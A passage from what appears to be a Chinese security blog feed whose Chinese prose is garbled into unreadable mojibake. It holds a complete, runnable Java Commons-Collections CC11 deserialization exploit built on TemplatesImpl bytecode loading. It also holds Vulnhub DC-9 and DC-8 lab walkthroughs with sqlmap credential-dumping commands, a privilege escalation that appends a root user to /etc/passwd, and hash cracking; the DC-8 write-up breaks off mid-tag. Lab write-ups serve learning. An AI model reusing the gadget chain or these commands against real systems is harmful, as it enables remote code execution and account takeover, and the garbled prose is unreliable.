href="#‰∏çÂ∏¶-Transformer-Êï∞ÁªÑÁöÑ-CC11-ÈìæÂ≠ê" class="headerlink" title="‰∏çÂ∏¶ Transformer Êï∞ÁªÑÁöÑ CC11 ÈìæÂ≠ê"></a>‰∏çÂ∏¶ Transformer Êï∞ÁªÑÁöÑ CC11 ÈìæÂ≠ê</h3><p>‰∏äÈù¢ÊòØÂ∏¶‰∫ÜTransformerÊï∞ÁªÑÁöÑÈÇ£‰πàÁé∞Âú®Ë¶ÅÂéªÊéâÔºåLazyMap#get ÁöÑÂèÇÊï∞ keyÔºå‰ºöË¢´‰º†Ëøõtransform()ÔºåÂÆûÈôÖ‰∏äÂÆÉÂèØ‰ª•ÊâÆÊºî ConstantTransformer ÁöÑËßíËâ≤‚Äî‚Äî ‰∏Ä‰∏™ÁÆÄÂçïÁöÑÂØπË±°‰º†ÈÄíËÄÖ„ÄÇ<br>Êàë‰ª¨ LazyMap.get(key) Áõ¥Êé•Ë∞ÉÁî® InvokerTransfomer.transform(key)ÔºåÁÑ∂ÂêéÂÉèCC2ÈÇ£Ê†∑Ë∞ÉÁî® TempalteImpl.newTransformer() Êù•ÂÆåÊàêÂêéÁª≠Ë∞ÉÁî®„ÄÇÂç≥ÂÅöÂ¶Ç‰∏ã‰øÆÊîπ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ÊõøÊç¢‰∏∫Â¶Ç‰∏ã‰ª£Á†Å</span></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br></pre></td></tr></table></figure><p>ÂÜçÂ∞ÜÂêéÈù¢Âá†Ë°åÁöÑ‰ª£Á†Å‰øÆÊîπÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line"> </span><br><span class="line"><span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">expMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">lazyMap.remove(templates);</span><br></pre></td></tr></table></figure><p>ÂæóÂà∞ÁöÑÊúÄÁªà EXP Â¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;  </span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.Map;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Dome</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E://java-tools/test.class&quot;</span>));  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);  </span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());  </span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);    </span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();   </span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)); </span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        expMap.put(tiedMapEntry, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line">        lazyMap.remove(templates);   </span><br><span class="line">        setFieldValue(lazyMap, <span class="string">&quot;factory&quot;</span>, invokerTransformer);  </span><br><span class="line">  </span><br><span class="line">        serialize(expMap);  </span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(obj, value);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        oos.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();  </span><br><span class="line">        <span class="keyword">return</span> obj;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h2><p>Ë∞ÉËØïÈÅáÂà∞‰∫ÜÁÇπÈóÆÈ¢òÔºå‰∏çÁü•ÈÅìÈÇ£‰∏™‰ª£Á†Å‰∏∫‰ªÄ‰πà‰∏çËÉΩË∞ÉÔºåÊÄªÁöÑÊù•ËØ¥ËøôÊù°ÈìæÂ≠êÂ∞±ÊòØCC2ÁöÑÂêéÂçäÈÉ®ÂàÜÂä†CC6ÁöÑÂâçÂçäÈÉ®ÂàÜÁ®çÂæÆ‰øÆÊîπÔºåÊ≤°Áî®Âà∞TransformerÊï∞ÁªÑÔºåÂØπ‰∫éÂêéÈù¢ÁöÑshiroÂ≠¶‰π†ÂÅö‰∏™Èì∫Âû´</p><p>ÂèÇËÄÉÔºö<br>Êú¨ÊñáÂ§ßÈÉΩÂèÇËÄÉ‰∏ãÈù¢‰∏§ÁØáÂçöÂÆ¢<br><a href="https://drun1baby.top/2022/07/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8709-CC11%E9%93%BE/">JavaÂèçÂ∫èÂàóÂåñCommons-CollectionsÁØá09-CC11Èìæ | Drunkbaby‚Äôs Blog (drun1baby.top)</a><br><a href="http://zhuabapa.top/2022/11/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc11/#bu-dai-transformer-shu-zu-de-cc-11-lian-zi">‚ÄòJavaÂèçÂ∫èÂàóÂåñ-cc11‚Äô | zer0_c|imb‚Äôs blog (zhuabapa.top)</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-9</title>
      <link href="/2023/07/Vulnhub-DC-9/"/>
      <url>/2023/07/Vulnhub-DC-9/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢É"><a href="#ÁéØÂ¢É" class="headerlink" title="ÁéØÂ¢É"></a>ÁéØÂ¢É</h2><p>‰∏ãËΩΩÂú∞ÂùÄÔºö<a href="https://www.vulnhub.com/entry/dc-9,412/">DC: 9 ~ VulnHub</a></p><h2 id="ÂºÄÂßãÊâìÈù∂"><a href="#ÂºÄÂßãÊâìÈù∂" class="headerlink" title="ÂºÄÂßãÊâìÈù∂"></a>ÂºÄÂßãÊâìÈù∂</h2><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102156811.png" alt="image-20230710215518164"><br>Á´ØÂè£ÂºÄÊîæ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102156096.png" alt="image-20230710215632028"><br>ËÆøÈóÆÈ°µÈù¢ÔºåÂú®searchÁïåÈù¢ÁªèËøá‰∏çÊñ≠Â∞ùËØïÁ°ÆÂÆûÂ≠òÂú®Ê≥®ÂÖ•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102156357.png" alt="image-20230710215648288"><br>‰∏¢ËøõsqlmapÁúãÁúã</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.142/results.php&quot; -data &quot;search=1&quot; --dbs</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102157562.png" alt="image-20230710215708752"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.142/results.php&quot; -data &quot;search=1&quot; -D users --tables</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102157055.png" alt="image-20230710215732019"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.142/results.php&quot; -data &quot;search=1&quot; -D users -T UserDetails --columns</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102157804.png" alt="image-20230710215742063"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.142/results.php&quot; -data &quot;search=1&quot; -D users -T UserDetails -C username,password --dump</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102158323.png" alt="image-20230710215806259"><br>ÈÉΩÊòØË¥¶Âè∑ÂØÜÁ†ÅÔºåÁÑ∂ÂêéÂéªÁúãÁúãÂè¶‰∏Ä‰∏™Â∫ì</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.142/results.php/results.php&quot; -data &quot;search=1&quot; -D Staff -tables</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102158975.png" alt="image-20230710215817948"><br>Âá∫Êù•‰∏§‰∏™Ë°®ÔºåËøôÈáåÈÄâÊã©ÂÖàÁúãUsersË°®Ôºå‰∏≠Èó¥‰∏çÂàóÂá∫Êï∞ÊçÆ‰∫Ü</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.142/results.php/results.php&quot; -data &quot;search=1&quot; -D Staff -T Users -C Username,Password --dump</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102158221.png" alt="image-20230710215827174"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102158899.png" alt="image-20230710215846860"><br>ÁÑ∂ÂêéÂéªÁôªÂΩïÔºåÊúÄÁªàÂú®Â¶Ç‰∏ã‰ΩçÁΩÆÊâæÂà∞Êñá‰ª∂ÂåÖÂê´<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102159667.png" alt="image-20230710215902265"><br>Âú®ËøôÈáåÈÅáÂà∞‰∏Ä‰∏™Êñ∞‰∏úË•øÔºå‰ª•ÂâçÊ≤°ÊúâÁ¢∞Âà∞Ëøá<br><strong>knockdÊúçÂä°ÔºöÂç≥Êï≤Èó®Á´ØÂè£ÊúçÂä°ÔºåËØ•ÊúçÂä°ÈÄöËøáÂä®ÊÄÅÁöÑÊ∑ªÂä†iptablesËßÑÂàôÊù•ÈöêËóèÁ≥ªÁªüÂºÄÂêØÁöÑÊúçÂä°Ôºå‰ΩøÁî®Ëá™ÂÆö‰πâÁöÑ‰∏ÄÁ≥ªÂàóÂ∫èÂàóÂè∑Êù•‚ÄúÊï≤Èó®‚ÄùÔºåÔºå‰ΩøÁ≥ªÁªüÂºÄÂêØÈúÄË¶ÅËÆøÈóÆÁöÑÊúçÂä°Á´ØÂè£ÔºåÊâçËÉΩÂØπÂ§ñËÆøÈóÆÔºå‰∏ç‰ΩøÁî®Êó∂ÔºåÂÜç‰ΩøÁî®Ëá™ÂÆö‰πâÂ∫èÂàóÂè∑Êù•‚ÄúÂÖ≥Èó®‚ÄùÔºåÂ∞ÜÁ´ØÂè£ÂÖ≥Èó≠Ôºå‰∏çÂØπÂ§ñÁõëÂê¨„ÄÇËøõ‰∏ÄÊ≠•ÊèêÂçá‰∫ÜÊúçÂä°ÂíåÁ≥ªÁªüÁöÑÂÆâÂÖ®ÊÄßÔºåÂÆÉÁöÑÈªòËÆ§ÈÖçÁΩÆÊñá‰ª∂ÊòØÔºö&#x2F;etc&#x2F;knockd.conf</strong><br>ÈÇ£‰πàÂéªËÆøÈóÆËøô‰∏™Êñá‰ª∂<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102159278.png" alt="image-20230710215927048"><br>ÁÑ∂Âêé‰ΩøÁî®ncÈÉΩÊï≤‰∏ÄÈÅç<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102159850.png" alt="image-20230710215950798"><br>ÁÑ∂Âêé‰ΩøÁî®nmapÂèëÁé∞22Á´ØÂè£ÊâìÂºÄ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102200168.png" alt="image-20230710220008671"><br>Êé•ÁùÄÊääÂàöÂàöÁàÜÂá∫Êù•ÁöÑÁî®Êà∑ÂØÜÁ†ÅÂÖ®ÈÉ®ÂºÑ‰∏Ä‰∏™Âº†Ë°®ÔºåÊúÄÁªàÁàÜÂá∫Êù•‰∏ãÈù¢Âá†‰∏™Áî®Êà∑<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102200215.png" alt="image-20230710220044501"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102200040.png" alt="image-20230710220056987"><br>‰∏â‰∏™Áî®Êà∑ÁªèÊü•ÁúãÂï•ÈÉΩÊ≤°Áî®Ôºå‰ΩÜÊòØÂú®Áî®Êà∑janitorÂæóÂà∞‰∏Ä‰∫õÂàóÂØÜÁ†Å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102201983.png" alt="image-20230710220113563"><br>Âä†ÂÖ•Âà∞Êàë‰ª¨ÂàöÂàöÁîüÊàêÁöÑÂØÜÁ†Å‰∏≠ÂÜçÁàÜ‰∏ÄÊ¨°ÔºåÂæóÂà∞‰∏Ä‰∏™Êñ∞Áî®Êà∑<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102201412.png" alt="image-20230710220131358"></p><h2 id="ÊèêÊùÉ"><a href="#ÊèêÊùÉ" class="headerlink" title="ÊèêÊùÉ"></a>ÊèêÊùÉ</h2><p>Êàë‰ª¨ÊâßË°å<code>sudo -l</code>ÁúãÁúã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102201614.png" alt="image-20230710220146891"><br>ËøõÂÖ•Ëøô‰∏™ÁõÆÂΩïÊ≤°Âï•ÂèëÁé∞ÔºåËøîÂõû‰∏ä‰∏§Â±ÇÂèëÁé∞‰∏Ä‰∏™test.pyÊñá‰ª∂<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102201582.png" alt="image-20230710220159542"><br>ÊúÄÁªàÂèëÁé∞ÂÆÉÊúâÁùÄÂÜôÂÖ•ÁõÆÂΩïÁöÑÂäüËÉΩ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ÈÄöËøáÂêë&#x2F;etc&#x2F;passwd‰∏≠Ê∑ªÂä†Áî®Êà∑ËææÂà∞ÊèêÊùÉÔºåÂπ∂‰∏îÂØÜÁ†ÅÈúÄË¶ÅÂä†ÂØÜ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt admin1 123456</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102202833.png" alt="image-20230710220214807"><br>Âú®Linux‰∏äÊâßË°åÔºåÁÑ∂ÂêéË∑≥ËΩ¨Âà∞&#x2F;opt&#x2F;devstuff&#x2F;dist&#x2F;testÁõÆÂΩï‰∏ã‰ΩøÁî®echoÂëΩ‰ª§Âú®&#x2F;tmpÁõÆÂΩï‰∏ãÂàõÂª∫‰∏Ä‰∏™Êñá‰ª∂ÔºåÊñá‰ª∂ÂêçËá™ÂÆö‰πâÂ∞±Ë°åÔºåÊàë‰ΩøÁî®userÔºå</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;admin:$1$admin1$kBcb8DdRJKeqQ2e6acZ0J0:0:0::/root:/bin/bash&#x27; &gt;&gt; /tmp/user</span><br></pre></td></tr></table></figure><p>ÂàõÂª∫ÂÆå‰πãÂêé‰ΩøÁî®sudoÂëΩ‰ª§ÊâßË°åuserÊñá‰ª∂Â∞Ü&#x2F;tmp&#x2F;test1ÁöÑÂÜÖÂÆπÂÜôÂÖ•Âà∞&#x2F;etc&#x2F;passwdÊñá‰ª∂‰∏≠ÔºåÁÑ∂Âêé‰ΩøÁî®sudoÂëΩ‰ª§ÊâßË°åtestÊñá‰ª∂Â∞Ü&#x2F;tmp&#x2F;userÁöÑÂÜÖÂÆπÂÜôÂÖ•Âà∞&#x2F;etc&#x2F;passwdÊñá‰ª∂‰∏≠</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./test /tmp/passwd /etc/passwd</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂàáÊç¢Ë¥¶Êà∑ÊèêÊùÉÊàêÂäü<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102202264.png" alt="image-20230710220228195"></p>]]></content>
      
      
      <categories>
          
          <category> Ê∏óÈÄè </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-DC-8</title>
      <link href="/2023/07/Vulnhub-DC-8/"/>
      <url>/2023/07/Vulnhub-DC-8/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢É"><a href="#ÁéØÂ¢É" class="headerlink" title="ÁéØÂ¢É"></a>ÁéØÂ¢É</h2><p>‰∏ãËΩΩÂú∞ÂùÄÔºö<a href="https://download.vulnhub.com/dc/DC-8.zip">https://download.vulnhub.com/dc/DC-8.zip</a></p><h2 id="ÂºÄÂßãÊâìÈù∂"><a href="#ÂºÄÂßãÊâìÈù∂" class="headerlink" title="ÂºÄÂßãÊâìÈù∂"></a>ÂºÄÂßãÊâìÈù∂</h2><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102142896.png" alt="image-20230710214105893"><br>ËÆøÈóÆIPÔºåÂæóÂà∞‰∏∫Drupal 7ÂíåDC-7‰∏ÄÊ®°‰∏ÄÊ†∑ÔºåÊ≤°Âï•ÊÄùË∑ØÊâ´‰∏™ÁõÆÂΩïÁúãÁúã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102144538.png" alt="image-20230710214246015"><br>ÁâàÊú¨‰∏∫7.67Ôºåmsf‰∏äÊ≤°ÊúâÂï•ÊºèÊ¥ûÔºå‰ΩÜÊòØËøôÈáåËÇØÂÆöÊòØÁõ¥Êé•ÊºèÊ¥ûÂà©Áî®Ôºå‰∫éÊòØÊâæÂà∞‰∫ÜÂ¶Ç‰∏ãÁïåÈù¢ÁöÑsqlÊ≥®ÂÖ•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102145659.png" alt="image-20230710214453951"><br>Áõ¥Êé•‰∏äsqlmap</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.141/?nid=1&quot; --dbs</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102145465.png" alt="image-20230710214534488"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.141/?nid=1&quot; -D d7db --table</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÊâæÂà∞Â¶Ç‰∏ãË°®ÔºåËøõÂÖ•ÁúãÁúã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102146562.png" alt="image-20230710214636451"><br>ÊúÄÁªàÊâæÂà∞Â≠óÊÆµ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.75.141/?nid=1&quot; -D d7db -T users -C name,pass --dump</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102146811.png" alt="image-20230710214656747"><br>Êé•ÁùÄ‰ΩøÁî®jhonÂéªÁàÜÁ†¥ÂÆÉÔºåÊääËøô‰∏§Ë°åÂØÜÁ†ÅÂ§çÂà∂Âà∞ËÆ∞‰∫ãÊú¨ÈáåÁÑ∂ÂêéÂéªÁàÜÁ†¥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102147518.png" alt="image-20230710214708462"><br>ÁàÜÁ†¥ÁªìÊûú‰∏∫<code>john/turtle</code>ÔºåÁÑ∂ÂêéÂú®‰∏ãÈù¢ÊèíÂÖ•‰ª£Á†Å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102147987.png" alt="image-20230710214719930"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102147628.png" alt="image-20230710214729585"><br>ÁÑ∂ÂêéÂ∞ÜshellËΩ¨‰∏∫‰∫§‰∫íÂºèshell<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102147680.png" alt="image-20230710214740153"></p><h2 id="ÊèêÊùÉ"><a href="#ÊèêÊùÉ" class="headerlink" title="ÊèêÊùÉ"></a>ÊèêÊùÉ</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102148572.png" alt="image-20230710214811512"><br>Êúâ‰∏™exim4ËøôÈáåËØï‰∏Ä‰∏ãÔºåÂÖàÁúã‰∏ãÁâàÊú¨<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307102148762.png" 